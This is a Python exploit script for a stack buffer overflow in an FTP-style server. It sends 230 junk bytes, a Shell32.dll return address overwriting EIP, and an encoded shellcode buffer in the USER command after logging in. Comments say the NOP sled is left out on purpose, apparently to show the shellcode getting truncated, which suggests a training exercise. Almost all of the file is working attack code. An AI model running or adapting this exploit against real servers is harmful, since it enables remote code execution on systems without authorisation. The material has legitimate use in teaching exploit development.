#!/usr/bin/python

import socket
import sys

junk = b"A" * 230
eip_override = b"\xD7\x30\x9D\x7C" #7C9D30D7 -- Shell32.dll
#NOPS = b"C" * 140

buf =  b""
buf += b"\xbe\xa0\xa4\x15\xe6\xda\xd1\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x31\x83\xc7\x04\x31\x77\x0f\x03\x77\xaf\x46"
buf += b"\xe0\x1a\x47\x04\x0b\xe3\x97\x69\x85\x06\xa6\xa9\xf1"
buf += b"\x43\x98\x19\x71\x01\x14\xd1\xd7\xb2\xaf\x97\xff\xb5"
buf += b"\x18\x1d\x26\xfb\x99\x0e\x1a\x9a\x19\x4d\x4f\x7c\x20"
buf += b"\x9e\x82\x7d\x65\xc3\x6f\x2f\x3e\x8f\xc2\xc0\x4b\xc5"
buf += b"\xde\x6b\x07\xcb\x66\x8f\xdf\xea\x47\x1e\x54\xb5\x47"
buf += b"\xa0\xb9\xcd\xc1\xba\xde\xe8\x98\x31\x14\x86\x1a\x90"
buf += b"\x65\x67\xb0\xdd\x4a\x9a\xc8\x1a\x6c\x45\xbf\x52\x8f"
buf += b"\xf8\xb8\xa0\xf2\x26\x4c\x33\x54\xac\xf6\x9f\x65\x61"
buf += b"\x60\x6b\x69\xce\xe6\x33\x6d\xd1\x2b\x48\x89\x5a\xca"
buf += b"\x9f\x18\x18\xe9\x3b\x41\xfa\x90\x1a\x2f\xad\xad\x7d"
buf += b"\x90\x12\x08\xf5\x3c\x46\x21\x54\x2a\x99\xb7\xe2\x18"
buf += b"\x99\xc7\xec\x0c\xf2\xf6\x67\xc3\x85\x06\xa2\xa0\x7a"
buf += b"\x4d\xef\x80\x12\x08\x65\x91\x7e\xab\x53\xd5\x86\x28"
buf += b"\x56\xa5\x7c\x30\x13\xa0\x39\xf6\xcf\xd8\x52\x93\xef"
buf += b"\x4f\x52\xb6\x93\x0e\xc0\x5a\x7a\xb5\x60\xf8\x82"


payload = junk + eip_override + buf

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nNow sending the malicious payload without giving the NOPS first, becuase of which a part of the shellcode will be missed when the pointer jumps to the esp from the shell or kernel module.\n"
# This is becuase there are few locations in between esp and eip and esp is not just above eip and hence without the NOPS the shellcode will have been cut off when the pointer jumps to esp from the module.

soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER someone' + '\r\n')
d = soc.recv(1024)

soc.send('PASS someone' + '\r\n')
d = soc.recv(1024)

soc.send('USER ' + payload + '\r\n')
d = soc.recv(1024)

soc.close()

print "\nDone sending the payload, without setting the NOPS first."
